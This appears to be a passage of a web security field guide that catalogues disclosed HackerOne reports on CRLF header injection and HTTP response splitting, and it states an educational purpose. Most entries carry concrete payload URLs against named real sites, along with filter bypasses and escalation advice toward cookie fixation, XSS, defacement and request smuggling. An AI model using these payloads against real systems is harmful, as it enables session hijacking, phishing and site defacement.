+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF header injection -&gt; forged domain-scoped Set-Cookie </b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled input in the URL path is reflected unsanitized into the HTTP response (a 302 Location redirect context), so injecting an encoded CRLF (%0D%0A) lets the attacker terminate the current header line and inject arbitrary new response headers such as Set-Cookie.</p>
+<h4>Method</h4><ol><li>Find an endpoint that reflects part of the request (path/param) into a response header, typically a redirect Location.</li><li>Append %0D%0A followed by an attacker header to the reflected value, e.g. .../advanced%0D%0ASet-Cookie:test2=test;domain=.TARGET</li><li>Confirm the injected Set-Cookie header appears verbatim in the raw response.</li><li>Because domain=.TARGET is used, the forged cookie is now sent by the browser to every subdomain of the parent domain, enabling cross-subdomain exploitation.</li></ol>
+<div class="pre">GET /advanced%0D%0ASet-Cookie:test2=test;domain=.TARGET HTTP/1.1
+Host: TARGET
+
+# Resulting response contains:
+# Set-Cookie: test2=test;domain=.TARGET</div>
+<p class="insight"><b>Insight —</b> Any reflection of request data into a response header (especially redirect Location) is a candidate for CRLF header injection. Use it to plant a domain-scoped cookie, then escalate: XSS if the cookie value is later reflected without encoding, bypass of double-submit-cookie CSRF tokens, or session fixation when the app does not rotate the session cookie post-login. Setting domain=.parent widens blast radius to all subdomains.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/245485" target="_blank" rel="noopener">hackerone.com/reports/245485</a></span><a class="src" href="#report-245485" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1038594" style="--sv:var(--sev-low)" data-sev="1" data-votes="32" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF header injection in URL path</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1038594</b> · gsa_vdp · none · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>gsa_vdp</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Encoded CRLF (%0D%0A) in the URL path is reflected into the response headers, allowing injection of arbitrary headers such as Set-Cookie.</p>
+<h4>Method</h4><ol><li>Append %0D%0A followed by an injected header to a path/parameter</li><li>Confirm the header appears in the response</li><li>Escalate to cookie fixation / cache poisoning / reflected XSS via injected headers</li></ol>
+<div class="pre">https://TARGET/%0D%0ASet-Cookie:crlfinjection=crlfinjection</div>
+<p class="insight"><b>Insight —</b> Probe path and redirect/Location-building parameters with %0D%0A (and %0d%0a, %E5%98%8A%E5%98%8D unicode variants); a reflected Set-Cookie or double newline proves splitting and can lead to XSS/cache poisoning.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1038594" target="_blank" rel="noopener">hackerone.com/reports/1038594</a></span><a class="src" href="#report-1038594" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-192667" style="--sv:var(--sev-low)" data-sev="1" data-votes="27" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF header injection -&gt; reflected XSS</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#192667</b> · starbucks · none · 27 votes · resolved</div>
+<div class="taxo"><span>Program <b>starbucks</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF -&gt; response splitting -&gt; XSS</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Request path is reflected into response headers without stripping CR/LF; injecting %0d%0a lets you add Content-Type:text/html, disable XSS protection, and write an HTML body.</p>
+<h4>Method</h4><ol><li>Inject %0d%0a in the path to break out of the header context</li><li>Add Content-Type:text/html and X-XSS-Protection:0, then a blank line and your HTML body</li></ol>
+<div class="pre">http://TARGET/%3f%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E</div>
+<p class="insight"><b>Insight —</b> Any reflection into a response header (Location, X-Original-link) that doesn't strip CRLF lets you forge headers and a body: set Content-Type:text/html + X-XSS-Protection:0 and append &lt;script&gt;.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/192667" target="_blank" rel="noopener">hackerone.com/reports/192667</a></span><a class="src" href="#report-192667" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-145128" style="--sv:var(--sev-low)" data-sev="1" data-votes="17" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF injection in redirect Location -&gt; Set-Cookie injection</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#145128</b> · ui · awarded · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>ui</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User input reflected into the HTTP response Location header without stripping CR/LF lets an attacker inject additional response headers (here Set-Cookie), enabling cookie forcing/session fixation and Double-Submit CSRF bypass.</p>
+<h4>Method</h4><ol><li>Find a redirect that echoes a path/param into the Location header.</li><li>Inject an encoded CR (%0d) followed by the header you want to add.</li><li>Confirm the injected Set-Cookie (or other header) appears in the response.</li></ol>
+<div class="pre">http://TARGET/%3f%0dSet-Cookie:crlf=injection%3bdomain=.TARGET%3b
+# response gains:
+# Set-Cookie:crlf=injection;domain=.target;</div>
+<p class="insight"><b>Insight —</b> Test every reflected redirect/Location for %0d/%0a (and %0d alone - some stacks need only CR). Injected Set-Cookie enables session fixation, cookie-scope attacks, and bypass of double-submit-cookie CSRF defenses; can also seed XSS via cookie.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/145128" target="_blank" rel="noopener">hackerone.com/reports/145128</a></span><a class="src" href="#report-145128" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-95981" style="--sv:var(--sev-low)" data-sev="1" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF injection into Set-Cookie via unencoded redirect param</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#95981</b> · deriv · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>deriv</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A request parameter is reflected unencoded into a response header (Set-Cookie/Location); injecting %0a/%0d lets the attacker add arbitrary response headers.</p>
+<h4>Method</h4><ol><li>Find a param reflected into a response header (cookie value, Location)</li><li>Inject %0a or %0d followed by a new header line</li><li>Confirm the injected header (e.g. Set-Cookie) appears in the response</li></ol>
+<div class="pre">https://TARGET/user/validate_link?step=account&amp;verify_token=%0aSet-Cookie:%20attacker=1;%0a
+
+# yields response header:
+# Set-Cookie: attacker=1;</div>
+<p class="insight"><b>Insight —</b> Any param echoed into a header is a header-injection primitive: set/overwrite cookies, drop security headers, and (if a body follows) attempt XSS/cache poisoning. Fix = URL-encode/strip CR/LF before reflecting.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/95981" target="_blank" rel="noopener">hackerone.com/reports/95981</a></span><a class="src" href="#report-95981" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-25275" style="--sv:var(--sev-low)" data-sev="1" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF injection via unescaped nginx $uri in Location</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#25275</b> · greenhouse · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>greenhouse</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">nginx redirect uses the raw $uri / $document_uri variable in the Location response header. URL-encoded CRLF (%0d%0a) in the request path is decoded into the header, letting an attacker inject arbitrary response headers (e.g. Set-Cookie) -&gt; cookie fixation / response splitting.</p>
+<h4>Method</h4><ol><li>Find a redirect that reflects the request path into Location (rewrite ... $uri)</li><li>Send %0d%0a followed by an injected header in the path</li><li>Observe the injected Set-Cookie / header in the response</li></ol>
+<div class="pre">GET /%0d%0aSet-Cookie:test=test;domain=.greenhouse.io HTTP/1.1
+Host: greenhouse.io
+
+# Response:
+# Location: http://www.greenhouse.io/
+# Set-Cookie:test=test;domain=.greenhouse.io</div>
+<p class="insight"><b>Insight —</b> Any reverse-proxy redirect echoing $uri/$request_uri/$document_uri into a header is a CRLF sink. Probe path and query with %0d%0a (and single %0a) then look for header injection; escalate to cookie fixation, cache poisoning, or reflected XSS via injected body.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/25275" target="_blank" rel="noopener">hackerone.com/reports/25275</a></span><a class="src" href="#report-25275" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1889477" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP response splitting via Ruby cgi gem / CGI::Cookie (CVE-2021-33621)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1889477</b> · ibb · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF injection -&gt; response splitting -&gt; header injecti</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Ruby cgi gem builds HTTP response headers (and CGI::Cookie's Set-Cookie attributes) from input without validating for CR/LF, so untrusted values flowing into header/cookie generation let an attacker inject additional response headers and/or a response body.</p>
+<h4>Method</h4><ol><li>Find a Ruby app using the cgi gem to emit responses / build CGI::Cookie objects from user input</li><li>Inject CRLF sequences into the tainted value (cookie name/value/attribute or header)</li><li>Observe injected headers or a split response (poisoned Set-Cookie, cache, or reflected body)</li></ol>
+<div class="pre"># tainted value carrying CRLF -&gt; injected header/body
+value = "x\r\nSet-Cookie: session=attacker\r\n\r\n&lt;injected body&gt;"
+# CGI::Cookie built from user input also allowed invalid attributes via CRLF</div>
+<p class="insight"><b>Insight —</b> Any framework/gem that concatenates untrusted data into response headers or Set-Cookie without stripping CR/LF is a response-splitting sink. Test header-reflected params and cookie-name/value/attribute fields with %0d%0a. Fixed in cgi 0.3.5/0.2.2/0.1.0.2 - version-check to tell exploitable from patched.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1889477" target="_blank" rel="noopener">hackerone.com/reports/1889477</a></span><a class="src" href="#report-1889477" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-153794" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP response splitting in WEBrick via CRLF in cookie value</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#153794</b> · ruby · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>ruby</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF header injection -&gt; arbitrary headers / response spl</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WEBrick did not strip CR/LF from values placed into response headers (e.g. Set-Cookie), so attacker-controlled input containing %0D%0A injects arbitrary response headers - classic HTTP response splitting / header injection (CVE-2017-17742).</p>
+<h4>Method</h4><ol><li>Find a parameter whose value is reflected into a response header (cookie, Location, custom header)</li><li>Inject CRLF (%0D%0A) followed by an arbitrary header</li><li>Observe the injected header in the raw response</li></ol>
+<div class="pre">curl -i 'http://TARGET:8080/?author=Aaron%0D%0AX-Foo:%20hacked'</div>
+<p class="insight"><b>Insight —</b> Whenever request input lands in a response header, test %0D%0A injection; it enables header injection, cookie setting, and (with a doubled CRLF) body/response splitting. Many language HTTP servers historically shared this flaw.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/153794" target="_blank" rel="noopener">hackerone.com/reports/153794</a></span><a class="src" href="#report-153794" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-52042" style="--sv:var(--sev-none)" data-sev="0" data-votes="58" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF filter bypass via UTF-8 multibyte last-byte extraction</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#52042</b> · x · awarded · 58 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A cookie-setting parameter was vulnerable to HTTP response splitting; a naive filter blocked raw 0x0A, but the app decoded multibyte UTF-8 and kept only the low byte, so a multibyte char ending in 0x0A reintroduced the newline.</p>
+<h4>Method</h4><ol><li>Find a reflected value copied into a response header (here reported_tweet_id -&gt; Set-Cookie)</li><li>Confirm raw %0A is filtered</li><li>Send a UTF-8 multibyte sequence whose last byte is 0x0A (e.g. %E5%98%8A -&gt; U+560A -&gt; keep 0x0A)</li><li>Injected CRLF splits the response, allowing header/body injection</li></ol>
+<div class="pre">https://twitter.com/i/safety/report_story?...&amp;reported_tweet_id=%E5%98%8ASet-Cookie:%20test
+# %E5%98%8A =&gt; U+560A =&gt; low byte 0x0A (LF); %E5%98%8D =&gt; 0x0D (CR)</div>
+<p class="insight"><b>Insight —</b> When CRLF/newline bytes are filtered, test overlong/multibyte encodings. Apps that Unicode-decode then truncate to the last byte let you smuggle 0x0D/0x0A. Try %E5%98%8A (LF) and %E5%98%8D (CR).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/52042" target="_blank" rel="noopener">hackerone.com/reports/52042</a></span><a class="src" href="#report-52042" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-53843" style="--sv:var(--sev-none)" data-sev="0" data-votes="30" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP response splitting via header-size overflow</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#53843</b> · x · awarded · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled parameters are reflected into response headers. Normal CRLF is filtered, but when the total header block exceeds a size limit (~7000 bytes) the server discards the original response and serves a freshly generated one that carries the attacker's injected headers.</p>
+<h4>Method</h4><ol><li>Find an endpoint that reflects a parameter into a response header</li><li>Pad a reflected param with thousands of characters so total header size exceeds ~7KB</li><li>Append your injected header (e.g. Set-Cookie) after the padding</li><li>Server regenerates the response and emits the injected header</li></ol>
+<div class="pre">https://twitter.com/i/safety/report_story?...&amp;reported_tweet_id=&lt;~7000+ spaces/chars&gt;set-cookie:a
+(when header block overflows, the injected 'set-cookie:a' header is served)</div>
+<p class="insight"><b>Insight —</b> A header-reflection sink that looks un-injectable because CRLF is sanitized can still be exploited by overflowing the header size to force the server to regenerate the response with the injected header. Test long padding on any param reflected into headers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/53843" target="_blank" rel="noopener">hackerone.com/reports/53843</a></span><a class="src" href="#report-53843" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-106427" style="--sv:var(--sev-none)" data-sev="0" data-votes="19" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP response splitting via CRLF in reflected parameter</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#106427</b> · shopify · USD 500 · 19 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A user parameter (shop) is reflected into a response header without stripping CR/LF, letting the attacker inject headers and a full second HTTP response.</p>
+<h4>Method</h4><ol><li>Put %0d%0a-encoded CRLF in the reflected param</li><li>Append forged headers + a full second response body</li><li>Confirm two responses / injected headers in Burp</li></ol>
+<div class="pre">https://v.shopify.com/last_shop?shop=x.myshopify.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a&lt;html&gt;deface&lt;/html&gt;</div>
+<p class="insight"><b>Insight —</b> Any param reflected into a header (Location, Set-Cookie, custom) is a CRLF candidate. Escalates to cache poisoning, defacement, XSS, and page hijacking on cached/proxied responses.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/106427" target="_blank" rel="noopener">hackerone.com/reports/106427</a></span><a class="src" href="#report-106427" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-145392" style="--sv:var(--sev-none)" data-sev="0" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Header injection via redirect_uri using RFC1945 header folding</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#145392</b> · nextcloud · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">redirect_url was passed unvalidated into PHP header('Location: ...'); on PHP builds honoring RFC1945 header folding, a CR-LF-TAB sequence folds a continuation line that IE interprets as a separate response header (e.g. Set-Cookie), yielding response header injection.</p>
+<h4>Method</h4><ol><li>Find a redirect param placed into a Location header</li><li>Inject %0d%0a%09 (CR LF TAB) then the header you want to smuggle</li><li>On vulnerable PHP the folded line is emitted; IE strips the tab and honors the injected header</li></ol>
+<div class="pre">/index.php?redirect_url=/%3f%0d%0a%09set-cookie:+hello=yoyoo</div>
+<p class="insight"><b>Insight —</b> When a param reflects into a response header, test not just raw %0d%0a but the folding continuation %0d%0a%09 / leading-space variants; some server stacks (backported PHP) allow folded headers that permissive clients (older IE) treat as real headers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/145392" target="_blank" rel="noopener">hackerone.com/reports/145392</a></span><a class="src" href="#report-145392" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-97292" style="--sv:var(--sev-none)" data-sev="0" data-votes="18" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF header injection -&gt; Set-Cookie scoped to parent domain (cookie tossing)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#97292</b> · security · awarded · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A redirect on a subdomain reflects the request path into the response headers without stripping CR/LF, letting the attacker inject Set-Cookie. Because subdomains can set cookies for the registrable parent domain, the injected cookie applies to the apex.</p>
+<h4>Method</h4><ol><li>Send a request whose path contains %0d%0a followed by a Set-Cookie with Domain=.parent</li><li>Server reflects it into the 302 response headers</li><li>Cookie is now set for the parent domain (session fixation / cookie tossing)</li></ol>
+<div class="pre">GET /%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com HTTP/1.1
+Host: info.hackerone.com
+# 'Domain =' (space) + %44 for D bypasses server code that pins the cookie domain</div>
+<p class="insight"><b>Insight —</b> CRLF on any subdomain redirect is a parent-domain cookie-injection primitive (fixation, cookie tossing, CSRF-token overwrite). Watch for filters normalizing the Domain attribute and bypass with case/spacing/URL-encoding of keywords.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/97292" target="_blank" rel="noopener">hackerone.com/reports/97292</a></span><a class="src" href="#report-97292" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-165102" style="--sv:var(--sev-none)" data-sev="0" data-votes="14" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF header injection in Python urllib (CVE-2016-5699)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#165102</b> · ibb · awarded · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF in outbound client request -&gt; header injection / req</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Python's httplib HTTPConnection.putheader() did not validate header names/values, so user-controlled header content containing CRLF could inject additional headers or split the request in any app using urllib/urllib2 with user-provided header data (or a CRLF-bearing URL).</p>
+<h4>Method</h4><ol><li>Find a server-side HTTP client (urllib/urllib2/httplib) where a URL, header name, or header value is user-controlled</li><li>Inject CRLF (\r\n) into that value</li><li>Confirm added headers / request line injection at the destination</li></ol>
+<div class="pre"># user-controlled value reaching putheader / a URL like:
+http://ATTACKER:11211/?\r\nInjected-Header: value\r\n\r\n&lt;smuggled payload&gt;</div>
+<p class="insight"><b>Insight —</b> Whenever an app builds outbound HTTP requests from user input, test CRLF in URLs and header fields - vulnerable clients let you inject headers or smuggle a second request (e.g. to memcached/redis on internal ports). Library-level CRLF bugs affect every consumer, so pin patched runtimes.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/165102" target="_blank" rel="noopener">hackerone.com/reports/165102</a></span><a class="src" href="#report-165102" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-209521" style="--sv:var(--sev-none)" data-sev="0" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF Content-Type injection for HTML content spoofing on error pages</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#209521</b> · greenhouse · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>greenhouse</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled URL data is reflected into a response (error/404 page) without stripping CRLF, letting an attacker inject a Content-Type header and body so the browser renders attacker-supplied HTML/text under the trusted domain.</p>
+<h4>Method</h4><ol><li>Append CRLF-encoded sequence to the path/parameter that gets reflected</li><li>Inject a Content-Type: text/html header followed by a blank line and HTML/text body</li><li>Victim visiting the crafted link on the trusted domain sees attacker content (defacement/phishing)</li></ol>
+<div class="pre">http://link.greenhouse.io/%0D%0AContent-Type:%20text/html%0D%0A%0D%0AIt%20has%20been%20changed,%20go%20to%20https://www.attacker.com</div>
+<p class="insight"><b>Insight —</b> On any endpoint that echoes path/query into an error page, test %0D%0A (and %0A) injection: if you can inject Content-Type or body you get content spoofing at minimum, response splitting/cache poisoning at worst. Even simple reflected text on a 404 is a content-spoofing/phishing primitive worth reporting when it renders in the victim's context.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/209521" target="_blank" rel="noopener">hackerone.com/reports/209521</a></span><a class="src" href="#report-209521" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-203673" style="--sv:var(--sev-none)" data-sev="0" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF header injection via redirect uri parameter</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#203673</b> · ui · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>ui</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Login.cgi took the uri GET parameter and, after urldecode, placed it directly into a Location response header with no CRLF sanitization, allowing header injection and open redirect.</p>
+<h4>Method</h4><ol><li>Supply uri with encoded CRLF and an injected header (%0d%0a)</li><li>Trigger the login/redirect so the value is emitted into the Location header</li><li>Observe injected header / arbitrary redirect in the 302 response</li></ol>
+<div class="pre">uri=/admin.cgi%0d%0aNewHeader:Value
+
+Response:
+HTTP/1.1 302 Found
+Location: /admin.cgi
+NewHeader: Value</div>
+<p class="insight"><b>Insight —</b> Any user-controlled value reflected into a Location/response header is a CRLF/open-redirect sink; test %0d%0a (and single %0a) injection and header smuggling.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/203673" target="_blank" rel="noopener">hackerone.com/reports/203673</a></span><a class="src" href="#report-203673" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">Request smuggling labs</a> (hands-on practice).</li>
+<li>All 22 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#technique-variants">Technique variants</a><a href="#inject-a-cookie-the-workhorse" style="padding-left:24px">↳ Inject a cookie (the workhorse)</a><a href="#full-response-splitting" style="padding-left:24px">↳ Full response splitting</a><a href="#reflected-xss-via-forged-content-type" style="padding-left:24px">↳ Reflected XSS via forged Content-Type</a><a href="#data-uri-xss-in-a-location-header" style="padding-left:24px">↳ data: URI XSS in a Location header</a><a href="#content-type-content-spoofing" style="padding-left:24px">↳ Content-Type / content spoofing</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (22)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ PortSwigger: Request smuggling</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
